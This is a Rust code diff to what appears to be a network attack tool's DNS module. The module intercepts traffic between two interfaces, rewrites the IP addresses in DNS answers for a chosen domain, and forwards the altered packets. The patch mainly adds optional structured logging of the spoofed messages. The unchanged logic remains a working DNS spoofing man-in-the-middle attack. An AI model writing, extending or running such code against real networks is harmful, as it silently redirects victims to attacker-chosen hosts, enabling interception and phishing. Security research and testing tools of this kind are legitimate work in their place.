@@ -29,6 +29,7 @@ pub struct Dns {
     pub interface1_name: String,
     pub interface2_name: String,
     pub stop_channel: Option<Sender<bool>>,
+    pub logging: bool,
     pub logs: Arc<AppendOnlyVec<DnsMessageLog>>,
     pub domain_name: String,
     pub ip_address: Ipv4Addr,
@@ -41,29 +42,39 @@ impl Default for Dns {
             interface2_name: String::new(),
             stop_channel: None,
             logs: Arc::new(AppendOnlyVec::<DnsMessageLog>::new()),
+            logging: false,
             domain_name: String::new(),
             ip_address: Ipv4Addr::UNSPECIFIED,
         }
     }
 }
 
-#[derive(Serialize, Clone)]
+#[derive(Serialize, Clone, Debug)]
 pub struct DnsMessageLog {
-    // Source
-    source_mac: String,
-    source_ip: String,
-    source_port: u16,
+    // Ethernet
+    eth_src_addr: String,
+    eth_dest_addr: String,
+    // Ipv4
+    ipv4_src_addr: String,
+    ipv4_dest_addr: String,
     // Destination
-    destination_mac: String,
-    destination_ip: String,
-    destination_port: u16,
+    udp_src_port: u16,
+    udp_dest_port: u16,
     // DNS
+    dns_qr: bool,
+    dns_aa: bool,
+    dns_rd: bool,
+    dns_ra: bool,
+    dns_questions: Vec<DnsQuestionLog>,
+    dns_answers: Vec<DnsAnswerLog>,
 }
-
-#[derive(Serialize)]
-pub struct DnsQuestionLog {}
-
-#[derive(Serialize)]
+#[derive(Serialize, Clone, Debug)]
+pub struct DnsQuestionLog {
+    name: String,
+    r#type: String,
+    class: String,
+}
+#[derive(Serialize, Clone, Debug)]
 pub struct DnsAnswerLog {}
 
 const INTERFACE_READ_TIMEOUT_MS: u64 = 1;
@@ -81,16 +92,14 @@ impl Attack for Dns {
         let modifier = |mut rx_channel: Box<dyn DataLinkReceiver>,
                         mut tx_channel: Box<dyn DataLinkSender>,
                         mut stop_channel: Receiver<bool>,
-                        logs: Arc<AppendOnlyVec<DnsMessageLog>>,
+                        logs: Option<Arc<AppendOnlyVec<DnsMessageLog>>>,
                         domain: String,
                         ip: Ipv4Addr| {
             move || {
-                info!("started DNS modification attack worker thread");
-
-                // Find the network interface with the provided name
+                info!("Started DNS worker thread");
                 loop {
                     if stop_channel.try_recv().is_ok() {
-                        debug!("Stopping task");
+                        info!("Stopped DNS worker thread");
                         break;
                     }
                     while let Ok(rx_raw) = rx_channel.next() {
@@ -141,14 +150,14 @@ impl Attack for Dns {
                         }
 
                         // Attempt to decode the UDP datagram payload as a DNS message
-                        let Ok(mut rx_dns_packet) = DnsMessage::decode(Bytes::from(rx_udp_packet.payload().to_vec())) else {
+                        let Ok(mut rx_dns_message) = DnsMessage::decode(Bytes::from(rx_udp_packet.payload().to_vec())) else {
                             error!("DNS message parse failed");
                             tx_channel.send_to(rx_raw, None);
                             continue;
                         };
 
                         // Check that the DNS message is a query response
-                        if !rx_dns_packet.flags.qr {
+                        if !rx_dns_message.flags.qr {
                             debug!("DNS message is not a response");
                             tx_channel.send_to(rx_raw, None);
                             continue;
@@ -156,7 +165,7 @@ impl Attack for Dns {
 
                         // Check that the DNS message contains an answer which
                         // references the target domain
-                        if rx_dns_packet
+                        if rx_dns_message
                             .answers
                             .iter()
                             .filter(|answer| match answer {
@@ -179,12 +188,16 @@ impl Attack for Dns {
                         }
 
                         // Perform modification
-                        rx_dns_packet
+                        rx_dns_message
                             .answers
                             .iter_mut()
                             .map(|answer| {
                                 if let RR::A(a) = answer {
                                     if a.domain_name.to_string() == domain {
+                                        info!(
+                                            "Modified resolved IP for domain {} from {} to {}",
+                                            domain, a.ipv4_addr, ip
+                                        );
                                         a.ipv4_addr = ip
                                     }
                                 }
@@ -192,7 +205,6 @@ impl Attack for Dns {
                             .for_each(drop);
 
                         // Reconstruct and transmit the packet
-                        info!("{:?}", rx_dns_packet);
                         tx_channel.build_and_send(
                             1,
                             rx_ethernet_frame.packet().len(),
@@ -215,7 +227,7 @@ impl Attack for Dns {
                                 // Udp
                                 let mut tx_udp_packet =
                                     MutableUdpPacket::new(tx_ipv4_packet.payload_mut()).unwrap();
-                                let tx_dns_packet = rx_dns_packet.encode().unwrap();
+                                let tx_dns_packet = rx_dns_message.encode().unwrap();
                                 tx_udp_packet.clone_from(&rx_udp_packet);
                                 tx_udp_packet.set_payload(&tx_dns_packet);
                                 tx_udp_packet.set_checksum(udp::ipv4_checksum(
@@ -227,23 +239,32 @@ impl Attack for Dns {
                         );
 
                         // Log the modification
-                        logs.push(DnsMessageLog {
-                            // Source
-                            source_mac: rx_ethernet_frame.get_source().to_string(),
-                            source_ip: rx_ipv4_packet.get_source().to_string(),
-                            source_port: rx_udp_packet.get_source(),
-                            // Destination
-                            destination_mac: rx_ethernet_frame.get_destination().to_string(),
-                            destination_ip: rx_ipv4_packet.get_destination().to_string(),
-                            destination_port: rx_udp_packet.get_destination(),
-                            // DNS
-                        });
+                        if let Some(ref log_vec) = logs {
+                            let log = DnsMessageLog {
+                                // Ethernet
+                                eth_src_addr: rx_ethernet_frame.get_source().to_string(),
+                                eth_dest_addr: rx_ethernet_frame.get_destination().to_string(),
+                                // Ipv4
+                                ipv4_src_addr: rx_ipv4_packet.get_source().to_string(),
+                                ipv4_dest_addr: rx_ipv4_packet.get_destination().to_string(),
+                                // Udp
+                                udp_src_port: rx_udp_packet.get_source(),
+                                udp_dest_port: rx_udp_packet.get_destination(),
+                                // Dns
+                                dns_qr: rx_dns_message.flags.qr,
+                                dns_aa: rx_dns_message.flags.aa,
+                                dns_ra: rx_dns_message.flags.ra,
+                                dns_rd: rx_dns_message.flags.rd,
+                                dns_questions: vec![],
+                                dns_answers: vec![],
+                            };
+                            debug!("Logged {:?}", log);
+                            log_vec.push(log);
+                        }
                     }
                 }
             }
         };
-        info!("{}", self.interface1_name);
-        info!("{}", self.interface2_name);
         let interface1 = pnet_datalink::interfaces()
             .into_iter()
             .filter(|iface: &NetworkInterface| iface.name == self.interface1_name)
@@ -279,11 +300,21 @@ impl Attack for Dns {
         let (tx_stop_channel, rx_stop_channel1) = broadcast::channel::<bool>(1);
         let rx_stop_channel2 = tx_stop_channel.subscribe();
         self.stop_channel = Some(tx_stop_channel);
+        let thread1_logs = if self.logging {
+            Some(self.logs.clone())
+        } else {
+            None
+        };
+        let thread2_logs = if self.logging {
+            Some(self.logs.clone())
+        } else {
+            None
+        };
         spawn_blocking(modifier(
             rx_channel1,
             tx_channel2,
             rx_stop_channel1,
-            self.logs.clone(),
+            thread1_logs,
             self.domain_name.clone(),
             self.ip_address.clone(),
         ));
@@ -291,7 +322,7 @@ impl Attack for Dns {
             rx_channel2,
             tx_channel1,
             rx_stop_channel2,
-            self.logs.clone(),
+            thread2_logs,
             self.domain_name.clone(),
             self.ip_address.clone(),
         ));
